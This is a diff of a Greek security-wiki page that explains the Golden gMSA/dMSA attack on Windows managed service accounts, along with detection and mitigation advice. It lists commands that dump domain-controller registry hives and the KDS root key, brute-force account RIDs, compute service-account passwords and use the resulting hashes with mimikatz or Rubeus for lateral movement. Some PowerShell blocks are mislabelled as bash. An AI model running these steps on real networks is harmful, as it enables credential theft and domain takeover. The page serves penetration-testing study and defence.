@@ -1,43 +1,43 @@
-# Χρυσή επίθεση gMSA/dMSA (Offline Derivation of Managed Service Account Passwords)
+# Golden gMSA/dMSA Attack (Offline Derivation of Managed Service Account Passwords)
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Επισκόπηση
 
-Οι Λογαριασμοί Υπηρεσιών Διαχείρισης Windows (MSA) είναι ειδικοί κύριοι που έχουν σχεδιαστεί για να εκτελούν υπηρεσίες χωρίς την ανάγκη χειροκίνητης διαχείρισης των κωδικών πρόσβασης τους.
-Υπάρχουν δύο κύριες παραλλαγές:
+Τα Windows Managed Service Accounts (MSA) είναι ειδικοί principals σχεδιασμένοι για την εκτέλεση services χωρίς να απαιτείται χειροκίνητη διαχείριση των passwords τους.
+Υπάρχουν δύο βασικές flavours:
 
-1. **gMSA** – ομαδικός Λογαριασμός Υπηρεσίας Διαχείρισης – μπορεί να χρησιμοποιηθεί σε πολλαπλούς υπολογιστές που είναι εξουσιοδοτημένοι στο χαρακτηριστικό `msDS-GroupMSAMembership` του.
-2. **dMSA** – εξουσιοδοτημένος Λογαριασμός Υπηρεσίας Διαχείρισης – ο (προεπισκόπηση) διάδοχος του gMSA, που βασίζεται στην ίδια κρυπτογραφία αλλά επιτρέπει πιο λεπτομερείς σενάρια εξουσιοδότησης.
+1. **gMSA** – group Managed Service Account – μπορεί να χρησιμοποιηθεί σε πολλαπλά hosts που είναι authorised στο attribute `msDS-GroupMSAMembership`.
+2. **dMSA** – delegated Managed Service Account – ο (preview) διάδοχος του gMSA, που βασίζεται στην ίδια cryptography, αλλά επιτρέπει πιο granular σενάρια delegation.
 
-Για και τις δύο παραλλαγές, ο **κωδικός πρόσβασης δεν αποθηκεύεται** σε κάθε Domain Controller (DC) όπως ένας κανονικός NT-hash. Αντίθετα, κάθε DC μπορεί να **παράγει** τον τρέχοντα κωδικό πρόσβασης εν κινήσει από:
+Και στις δύο παραλλαγές, το **password δεν αποθηκεύεται** σε κάθε Domain Controller (DC) όπως ένα κανονικό NT-hash. Αντίθετα, κάθε DC μπορεί να κάνει **derive** το τρέχον password on-the-fly από:
 
-* Το κλειδί **KDS Root Key** σε επίπεδο δάσους (`KRBTGT\KDS`) – τυχαία παραγόμενο GUID-ονομασμένο μυστικό, αναπαραγόμενο σε κάθε DC κάτω από το δοχείο `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
-* Το **SID** του στοχευόμενου λογαριασμού.
-* Ένα **ManagedPasswordID** ανά λογαριασμό (GUID) που βρίσκεται στο χαρακτηριστικό `msDS-ManagedPasswordId`.
+* Το forest-wide **KDS Root Key** (`KRBTGT\KDS`) – randomly generated GUID-named secret, replicated σε κάθε DC κάτω από το container `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
+* Το **SID** του target account.
+* Ένα per-account **ManagedPasswordID** (GUID), που βρίσκεται στο attribute `msDS-ManagedPasswordId`.
 
-Η παραγωγή είναι: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 byte blob τελικά **base64-encoded** και αποθηκευμένο στο χαρακτηριστικό `msDS-ManagedPassword`.
-Δεν απαιτείται καμία κίνηση Kerberos ή αλληλεπίδραση με το domain κατά τη διάρκεια της κανονικής χρήσης κωδικού πρόσβασης – ένας μέλος υπολογιστής παράγει τον κωδικό πρόσβασης τοπικά όσο γνωρίζει τις τρεις εισόδους.
+Η derivation είναι: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob 240 bytes, το οποίο τελικά γίνεται **base64-encoded** και αποθηκεύεται στο attribute `msDS-ManagedPassword`.
+Κατά τη φυσιολογική χρήση του password δεν απαιτείται Kerberos traffic ή domain interaction – ένα member host κάνει derive το password locally, εφόσον γνωρίζει τα τρία inputs.
 
-## Χρυσή επίθεση gMSA / Χρυσή dMSA
+## Golden gMSA / Golden dMSA Attack
 
-Εάν ένας επιτιθέμενος μπορεί να αποκτήσει και τις τρεις εισόδους **offline**, μπορεί να υπολογίσει **έγκυρους τρέχοντες και μελλοντικούς κωδικούς πρόσβασης** για **οποιονδήποτε gMSA/dMSA στο δάσος** χωρίς να αγγίξει ξανά το DC, παρακάμπτοντας:
+Αν ένας attacker μπορέσει να αποκτήσει και τα τρία inputs **offline**, μπορεί να υπολογίσει **έγκυρα τρέχοντα και μελλοντικά passwords** για οποιοδήποτε gMSA/dMSA στο forest, χωρίς να αγγίξει ξανά το DC, παρακάμπτοντας:<sup>[[1]](#references)[[2]](#references)</sup>
 
-* Τον έλεγχο ανάγνωσης LDAP
-* Τα διαστήματα αλλαγής κωδικών πρόσβασης (μπορούν να προϋπολογίσουν)
+* LDAP read auditing
+* Password change intervals (μπορούν να κάνουν pre-compute)
 
-Αυτό είναι ανάλογο με ένα *Χρυσό Εισιτήριο* για λογαριασμούς υπηρεσιών.
+Αυτό είναι ανάλογο με ένα *Golden Ticket* για service accounts.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ### Προαπαιτούμενα
 
-1. **Συμβιβασμός σε επίπεδο δάσους** ενός **DC** (ή Enterprise Admin), ή πρόσβαση `SYSTEM` σε έναν από τους DCs στο δάσος.
-2. Δυνατότητα καταμέτρησης λογαριασμών υπηρεσιών (ανάγνωση LDAP / brute-force RID).
-3. .NET ≥ 4.7.2 x64 workstation για να τρέξει [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) ή ισοδύναμο κώδικα.
+1. **Forest-level compromise** ενός **DC** (ή Enterprise Admin), ή πρόσβαση `SYSTEM` σε ένα από τα DCs του forest.
+2. Δυνατότητα enumeration των service accounts (LDAP read / RID brute-force).
+3. Workstation .NET ≥ 4.7.2 x64 για την εκτέλεση του [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) ή equivalent code.
 
-### Χρυσή gMSA / dMSA
-##### Φάση 1 – Εξαγωγή του KDS Root Key
+### Golden gMSA / dMSA
+#### Phase 1 – Extract the KDS Root Key
 
-Dump από οποιοδήποτε DC (Volume Shadow Copy / raw SAM+SECURITY hives ή απομακρυσμένα μυστικά):
+Κάντε dump από οποιοδήποτε DC (Volume Shadow Copy / raw SAM+SECURITY hives ή remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
 ```cmd
 reg save HKLM\SECURITY security.hive
 reg save HKLM\SYSTEM  system.hive
@@ -53,70 +53,69 @@ GoldendMSA.exe kds
 # With GoldenGMSA
 GoldenGMSA.exe kdsinfo
 ```
-Η συμβολοσειρά base64 που ονομάζεται `RootKey` (όνομα GUID) απαιτείται σε επόμενα βήματα.
+Το base64 string με την ετικέτα `RootKey` (όνομα GUID) απαιτείται στα επόμενα βήματα.<sup>[[1]](#references)[[2]](#references)</sup>
 
-##### Φάση 2 – Καταμέτρηση αντικειμένων gMSA / dMSA
+##### Φάση 2 – Καταγραφή αντικειμένων gMSA / dMSA
 
-Ανακτήστε τουλάχιστον `sAMAccountName`, `objectSid` και `msDS-ManagedPasswordId`:
-```powershell
+Ανακτήστε τουλάχιστον τα `sAMAccountName`, `objectSid` και `msDS-ManagedPasswordId`:<sup>[[1]](#references)[[2]](#references)</sup>
+```bash
 # Authenticated or anonymous depending on ACLs
 Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
 Select sAMAccountName,objectSid,msDS-ManagedPasswordId
 
 GoldenGMSA.exe gmsainfo
 ```
-[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) υλοποιεί βοηθητικές λειτουργίες:
-```powershell
+Το [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) υλοποιεί βοηθητικές λειτουργίες:<sup>[[1]](#references)</sup>
+```bash
 # LDAP enumeration (kerberos / simple bind)
 GoldendMSA.exe info -d example.local -m ldap
 
 # RID brute force if anonymous binds are blocked
 GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
 ```
-##### Φάση 3 – Μαντέψτε / Ανακαλύψτε το ManagedPasswordID (όταν λείπει)
+##### Φάση 3 – Guess / Discover το ManagedPasswordID (όταν λείπει)
 
-Ορισμένες αναπτύξεις *αφαιρούν* το `msDS-ManagedPasswordId` από τις αναγνώσεις που προστατεύονται από ACL. 
-Δεδομένου ότι το GUID είναι 128-bit, η απλή βίαιη δοκιμή είναι μη εφικτή, αλλά:
+Ορισμένα deployments *strip* το `msDS-ManagedPasswordId` από ACL-protected reads.
+Επειδή το GUID είναι 128-bit, το naive bruteforce είναι ανέφικτο, αλλά:
 
-1. Τα πρώτα **32 bits = Unix epoch time** της δημιουργίας του λογαριασμού (ανάλυση λεπτών).
-2. Ακολουθούν 96 τυχαία bits.
+1. Τα πρώτα **32 bits = Unix epoch time** της δημιουργίας του account (με ακρίβεια λεπτών).
+2. Ακολουθούν 96 random bits.
 
-Επομένως, μια **στενή λίστα λέξεων ανά λογαριασμό** (± λίγες ώρες) είναι ρεαλιστική.
-```powershell
+Επομένως, ένα **narrow wordlist ανά account** (± λίγες ώρες) είναι ρεαλιστικό.
+```bash
 GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
 ```
-Το εργαλείο υπολογίζει υποψήφιες κωδικούς πρόσβασης και συγκρίνει το base64 blob τους με το πραγματικό `msDS-ManagedPassword` χαρακτηριστικό – η αντιστοιχία αποκαλύπτει το σωστό GUID.
+Το εργαλείο υπολογίζει υποψήφιους κωδικούς πρόσβασης και συγκρίνει το base64 blob τους με το πραγματικό attribute `msDS-ManagedPassword` – η αντιστοιχία αποκαλύπτει το σωστό GUID.
 
-##### Φάση 4 – Υπολογισμός & Μετατροπή Κωδικού Πρόσβασης εκτός σύνδεσης
+##### Φάση 4 – Offline Υπολογισμός και Μετατροπή Κωδικού Πρόσβασης
 
-Μόλις γνωρίζεται το ManagedPasswordID, ο έγκυρος κωδικός πρόσβασης είναι ένα βήμα μακριά:
-```powershell
+Μόλις γίνει γνωστό το ManagedPasswordID, ο έγκυρος κωδικός πρόσβασης απέχει μόνο μία εντολή:<sup>[[1]](#references)[[2]](#references)</sup>
+```bash
 # derive base64 password
 GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
 GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
 ```
-Οι παραγόμενοι κατακερματισμοί μπορούν να εισαχθούν με **mimikatz** (`sekurlsa::pth`) ή **Rubeus** για κατάχρηση Kerberos, επιτρέποντας κρυφή **πλευρική κίνηση** και **επιμονή**.
+Τα resulting hashes μπορούν να γίνουν inject με **mimikatz** (`sekurlsa::pth`) ή **Rubeus** για Kerberos abuse, επιτρέποντας stealth **lateral movement** και **persistence**.
 
 ## Ανίχνευση & Μετριασμός
 
-* Περιορίστε τις δυνατότητες **αντίγραφου ασφαλείας DC και ανάγνωσης μητρώου** σε διαχειριστές Tier-0.
-* Παρακολουθήστε τη δημιουργία **Λειτουργίας Επαναφοράς Υπηρεσιών Καταλόγου (DSRM)** ή **Αντίγραφο Σκιάς Όγκου** σε DCs.
-* Ελέγξτε τις αναγνώσεις / αλλαγές στα `CN=Master Root Keys,…` και τις σημαίες `userAccountControl` των λογαριασμών υπηρεσιών.
-* Ανιχνεύστε ασυνήθιστες **εγγραφές κωδικών πρόσβασης base64** ή ξαφνική επαναχρησιμοποίηση κωδικών πρόσβασης υπηρεσιών σε διάφορους υπολογιστές.
-* Σκεφτείτε να μετατρέψετε τις gMSAs υψηλής προνομιακής πρόσβασης σε **κλασικούς λογαριασμούς υπηρεσιών** με κανονικές τυχαίες περιστροφές όπου η απομόνωση Tier-0 δεν είναι δυνατή.
+* Περιορίστε τις δυνατότητες **DC backup and registry hive read** σε administrators του Tier-0.
+* Παρακολουθείτε τη δημιουργία **Directory Services Restore Mode (DSRM)** ή **Volume Shadow Copy** σε DCs.
+* Ελέγχετε τις αναγνώσεις / αλλαγές στο `CN=Master Root Keys,…` και στα flags `userAccountControl` των service accounts.
+* Εντοπίζετε ασυνήθιστες εγγραφές κωδικών πρόσβασης **base64** ή ξαφνική επαναχρησιμοποίηση κωδικών πρόσβασης service accounts σε hosts.
+* Εξετάστε τη μετατροπή των gMSAs υψηλών δικαιωμάτων σε **classic service accounts** με τακτικές τυχαίες αλλαγές κωδικών, όπου η απομόνωση Tier-0 δεν είναι δυνατή.
 
 ## Εργαλεία
 
-* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – αναφορά υλοποίησης που χρησιμοποιείται σε αυτή τη σελίδα.
-* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – αναφορά υλοποίησης που χρησιμοποιείται σε αυτή τη σελίδα.
+* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – reference implementation που χρησιμοποιείται σε αυτή τη σελίδα.<sup>[[3]](#references)</sup>
+* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – reference implementation που χρησιμοποιείται σε αυτή τη σελίδα.
 * [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
-* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket χρησιμοποιώντας παραγόμενα κλειδιά AES.
+* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket με χρήση derived AES keys.
 
 ## Αναφορές
 
-- [Golden dMSA – παράκαμψη αυθεντικοποίησης για εξουσιοδοτημένους Διαχειριζόμενους Λογαριασμούς Υπηρεσιών](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
-- [gMSA Active Directory Επιθέσεις Λογαριασμών](https://www.semperis.com/blog/golden-gmsa-attack/)
-- [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
-- [Improsec – Χρυσή επίθεση εμπιστοσύνης gMSA](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)
+- [1] [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
+- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
+- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
 
 {{#include ../../banners/hacktricks-training.md}}
